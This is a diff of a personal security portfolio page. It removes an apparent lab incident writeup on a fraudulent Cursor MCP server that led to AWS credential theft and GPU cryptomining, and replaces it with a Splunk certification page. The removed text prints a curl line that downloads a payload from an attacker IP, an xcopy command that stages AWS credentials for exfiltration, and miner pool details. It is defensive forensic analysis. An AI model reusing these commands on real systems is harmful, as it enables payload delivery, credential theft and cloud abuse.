@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious MCP Integration to AWS Cryptomining · johann.</title>
-    <meta name="description" content="High-confidence reconstruction of a fraudulent Cursor MCP server leading to endpoint execution, AWS admin credential theft, 16 GPU instances, and XMRig cryptomining.">
-    <link rel="canonical" href="https://johannweingertner.github.io/writeup/writeup-2">
+    <title>Core Certified Power User · johann.</title>
+    <meta name="description" content="Advanced Splunk certification validating expertise in search processing language and data analysis.">
+    <link rel="canonical" href="https://johannweingertner.github.io/certifications/splk-1002">
     <meta name="author" content="Johann Weingertner">
     <meta name="theme-color" content="#0a0a0a">
-    <meta property="og:type" content="article">
+    <meta property="og:type" content="website">
     <meta property="og:site_name" content="johann.">
-    <meta property="og:title" content="Malicious MCP Integration to AWS Cryptomining · johann.">
-    <meta property="og:description" content="High-confidence reconstruction of a fraudulent Cursor MCP server leading to endpoint execution, AWS admin credential theft, 16 GPU instances, and XMRig cryptomining.">
-    <meta property="og:url" content="https://johannweingertner.github.io/writeup/writeup-2">
-    <meta property="og:image" content="https://johannweingertner.github.io/assets/writeups/cursorjack/image1.webp">
+    <meta property="og:title" content="Core Certified Power User · johann.">
+    <meta property="og:description" content="Advanced Splunk certification validating expertise in search processing language and data analysis.">
+    <meta property="og:url" content="https://johannweingertner.github.io/certifications/splk-1002">
+    <meta property="og:image" content="https://johannweingertner.github.io/badges/splunk.png">
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="Malicious MCP Integration to AWS Cryptomining · johann.">
-    <meta name="twitter:description" content="High-confidence reconstruction of a fraudulent Cursor MCP server leading to endpoint execution, AWS admin credential theft, 16 GPU instances, and XMRig cryptomining.">
-    <meta name="twitter:image" content="https://johannweingertner.github.io/assets/writeups/cursorjack/image1.webp">
+    <meta name="twitter:title" content="Core Certified Power User · johann.">
+    <meta name="twitter:description" content="Advanced Splunk certification validating expertise in search processing language and data analysis.">
+    <meta name="twitter:image" content="https://johannweingertner.github.io/badges/splunk.png">
     <link rel="alternate" type="application/rss+xml" title="Writeups · johann." href="https://johannweingertner.github.io/feed.xml">
     <link rel="icon" type="image/png" href="/assets/favicon.png">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -368,49 +368,13 @@
 <div id="root"></div>
 <noscript>
 <article>
-  <p><a href="/writeup">Back to Writeups</a></p>
-  <h1>Malicious MCP Integration to AWS Cryptomining</h1>
-  <p>Jul 2026</p>
-  <p>High-confidence reconstruction of a fraudulent Cursor MCP server leading to endpoint execution, AWS admin credential theft, 16 GPU instances, and XMRig cryptomining.</p>
-  <h2>Executive Summary</h2>
-<p>A backend developer searching for a Cursor Model Context Protocol (MCP) integration visited the fraudulent site awesomeawsmcp.com and installed an MCP server named “AWS dev ops.” Its configuration invoked cmd.exe to download and execute s.exe from 3.72.63.40. The payload established command-and-control, staged the workstation’s AWS credential directory, and enabled theft of the privileged admin IAM user in account 990227772331.</p>
-<p>The actor then launched 16 p3.2xlarge EC2 instances across four AWS regions and deployed an XMRig RandomX miner through unMineable. The configured Solana payout wallet was publicly labeled “Drift Exploiter 1” and received 45,292.208963921 dSOL from Drift Vault.</p>
-<table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td>Incident / Lab</td><td>CursorJack</td></tr><tr><td>Incident date</td><td>20–21 April 2026 (UTC)</td></tr><tr><td>Severity</td><td>Critical</td></tr><tr><td>Confidence</td><td>High</td></tr><tr><td>Affected platforms</td><td>Windows, Cursor IDE, AWS, Solana</td></tr><tr><td>Analyst</td><td>Johann Weingertner</td></tr><tr><td>Classification</td><td>Confidential — Training / Lab Investigation</td></tr></tbody></table>
-<h2>Attack Timeline</h2>
-<table><thead><tr><th>UTC time</th><th>Finding</th></tr></thead><tbody><tr><td>2026-04-20 20:57</td><td>Victim visited http://awesomeawsmcp.com/.</td></tr><tr><td>Shortly after</td><td>Cursor MCP server “AWS dev ops” installed with embedded curl command.</td></tr><tr><td>20:58:11</td><td>curl.exe downloaded s.exe from 3.72.63.40.</td></tr><tr><td>20:58:42</td><td>Payload executed; first observed C2 command was pwd.</td></tr><tr><td>21:03:07</td><td>C:\Users\Administrator\.aws copied to hidden .exfil staging directory.</td></tr><tr><td>2026-04-21 10:15 onward</td><td>Stolen admin credentials used from 3.72.63.40.</td></tr><tr><td>10:15–11:00+</td><td>16 p3.2xlarge instances launched across four regions.</td></tr><tr><td>Post-launch</td><td>XMRig configured for rx.unmineable.com:3333 and attacker Solana wallet.</td></tr></tbody></table>
-<h2>Initial Access &amp; Execution</h2>
-<p>Chromium history recorded a single typed visit to awesomeawsmcp.com titled “AWS dev ops.” The raw Chromium timestamp 13421192228031344 converts to 2026-04-20 20:57:08.031344Z. Cursor’s mcp.json defined the server as cmd.exe /c with a download-and-run chain targeting http://3.72.63.40:80/payload/s.exe.</p>
-<figure><img src="/assets/writeups/cursorjack/image1.webp" alt="Figure 1 — Browser history showing awesomeawsmcp.com" loading="lazy" decoding="async" /><figcaption>Figure 1 — Browser history showing awesomeawsmcp.com</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image7.webp" alt="Figure 2 — Chromium timestamp conversion" loading="lazy" decoding="async" /><figcaption>Figure 2 — Chromium timestamp conversion</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image2.webp" alt="Figure 3 — Cursor MCP configuration" loading="lazy" decoding="async" /><figcaption>Figure 3 — Cursor MCP configuration</figcaption></figure>
-<pre><code>curl -s http://3.72.63.40:80/payload/s.exe -o C:\Users\ADMINI~1\AppData\Local\Temp\s.exe</code></pre>
-<figure><img src="/assets/writeups/cursorjack/image12.webp" alt="Figure 4 — Sysmon payload download event" loading="lazy" decoding="async" /><figcaption>Figure 4 — Sysmon payload download event</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image13.webp" alt="Figure 5 — First observed C2 command" loading="lazy" decoding="async" /><figcaption>Figure 5 — First observed C2 command</figcaption></figure>
-<table><thead><tr><th>Evidence</th><th>Observed value</th></tr></thead><tbody><tr><td>Download technique</td><td>T1105 — Ingress Tool Transfer</td></tr><tr><td>First C2 command</td><td>C:\Windows\system32\cmd.exe /C pwd</td></tr><tr><td>Payload path</td><td>C:\Users\ADMINI~1\AppData\Local\Temp\s.exe</td></tr><tr><td>Credential staging</td><td>xcopy C:\Users\Administrator\.aws\* C:\Users\Administrator\.exfil\ /E /I /H</td></tr></tbody></table>
-<figure><img src="/assets/writeups/cursorjack/image11.webp" alt="Figure 6 — AWS credential staging" loading="lazy" decoding="async" /><figcaption>Figure 6 — AWS credential staging</figcaption></figure>
-<h2>AWS Credential Theft &amp; Cloud Abuse</h2>
-<p>CloudTrail filtering on sourceIPAddress=3.72.63.40 returned 25 events attributed to arn:aws:iam::990227772331:user/admin. RunInstances filtering identified 16 launches: four each in ap-southeast-1, us-east-1, eu-west-1, and us-west-2. Every request used the expensive p3.2xlarge GPU family and the plausible production tag Name=prod-web-server; monitoring was disabled.</p>
-<figure><img src="/assets/writeups/cursorjack/image5.webp" alt="Figure 7 — CloudTrail identity attribution" loading="lazy" decoding="async" /><figcaption>Figure 7 — CloudTrail identity attribution</figcaption></figure>
-<table><thead><tr><th>CloudTrail attribute</th><th>Observed value</th></tr></thead><tbody><tr><td>Source IP</td><td>3.72.63.40</td></tr><tr><td>IAM identity</td><td>arn:aws:iam::990227772331:user/admin</td></tr><tr><td>User agent</td><td>InfrastructureAutomation/3.0.1 go1.22.5 (cloud-ops-deployment) linux/amd64</td></tr><tr><td>Unauthorized resources</td><td>16 p3.2xlarge instances across 4 regions</td></tr></tbody></table>
-<figure><img src="/assets/writeups/cursorjack/image6.webp" alt="Figure 8 — Multi-region RunInstances activity" loading="lazy" decoding="async" /><figcaption>Figure 8 — Multi-region RunInstances activity</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image8.webp" alt="Figure 9 — p3.2xlarge instance request" loading="lazy" decoding="async" /><figcaption>Figure 9 — p3.2xlarge instance request</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image9.webp" alt="Figure 10 — prod-web-server resource tag" loading="lazy" decoding="async" /><figcaption>Figure 10 — prod-web-server resource tag</figcaption></figure>
-<h2>Cryptomining Payload</h2>
-<p>The recovered mining.sh script downloaded XMRig 6.26.0, extracted it under /tmp, and launched it with nohup. It used RandomX, capped CPU at 50%, suppressed console output, and wrote to /tmp/.sys_monitor.log.</p>
-<pre><code>Pool: rx.unmineable.com:3333
-Wallet: SOL:HkGz4KmoZ7Zmk7HN6ndJ31UJ1qZ2qgwQxgVqQwovpZES
-Worker: ip-&lt;hostname-derived&gt;</code></pre>
-<figure><img src="/assets/writeups/cursorjack/image4.webp" alt="Figure 11 — Recovered XMRig mining script" loading="lazy" decoding="async" /><figcaption>Figure 11 — Recovered XMRig mining script</figcaption></figure>
-<h2>Blockchain Attribution &amp; Limitations</h2>
-<p>Solscan labeled the payout wallet “Drift Exploiter 1” and showed an incoming transfer of 45,292.208963921 dSOL from Drift Vault, with a displayed historical value of $4,466,805.96. The exact wallet match provides strong infrastructure-level correlation, but public blockchain labels and search results are corroborating intelligence rather than sole proof of identity.</p>
-<figure><img src="/assets/writeups/cursorjack/image3.webp" alt="Figure 12 — Public wallet attribution research" loading="lazy" decoding="async" /><figcaption>Figure 12 — Public wallet attribution research</figcaption></figure>
-<figure><img src="/assets/writeups/cursorjack/image10.webp" alt="Figure 13 — Solscan Drift Vault transfer" loading="lazy" decoding="async" /><figcaption>Figure 13 — Solscan Drift Vault transfer</figcaption></figure>
-<h2>Root Cause</h2>
-<ul><li>Untrusted MCP integration installed without publisher or repository validation</li><li>Cursor allowed arbitrary shell execution from MCP configuration</li><li>Long-lived AWS credentials stored locally on the developer workstation</li><li>Admin IAM permissions allowed expensive multi-region GPU deployment</li><li>No SCP, quota, budget alarm, or regional restriction stopped the abuse</li></ul>
-<h2>Containment &amp; Hardening</h2>
-<ul><li>Preserve and isolate the workstation before removing the MCP configuration or payload</li><li>Disable the compromised admin user, revoke keys and sessions, and rotate all accessible secrets</li><li>Terminate unauthorized EC2 resources and inspect related cloud artifacts in every region</li><li>Block awesomeawsmcp.com, 3.72.63.40, the payload URL, and rx.unmineable.com:3333</li><li>Allow-list MCP servers; detect IDE-to-shell-to-temporary-binary execution chains</li><li>Use short-lived MFA-protected AWS roles, SCPs, region and instance-family restrictions, budgets, and anomaly alerts</li></ul>
-<h2>Conclusion</h2>
-<p>The supplied endpoint, Cursor, CloudTrail, mining-script, and blockchain artifacts support a high-confidence conclusion that a fraudulent MCP integration enabled endpoint code execution, privileged AWS credential theft, unauthorized GPU deployment, and cryptomining. The report is based on supplied lab artifacts; time-sensitive public labels and token values should be preserved with timestamps outside a training context.</p>
+  <p><a href="/certifications">Back to Certifications</a></p>
+  <h1>Core Certified Power User</h1>
+  <p>Splunk · 2026 · Active</p>
+  <p>Advanced Splunk certification validating expertise in search processing language and data analysis.</p>
+  <p><img src="/assets/certifications/splunk.pdf.webp" alt="Core Certified Power User certificate" /></p>
+  
+  <h2>What I learned</h2><ul><li>Advanced SPL for complex search queries and data correlation</li><li>Built dashboards, reports, and alerts for security monitoring</li><li>Used statistical and eval commands for threat analysis</li><li>Created knowledge objects including field extractions and lookups</li><li>Investigated security incidents using Splunk SIEM workflows</li></ul>
 </article>
 </noscript>
 
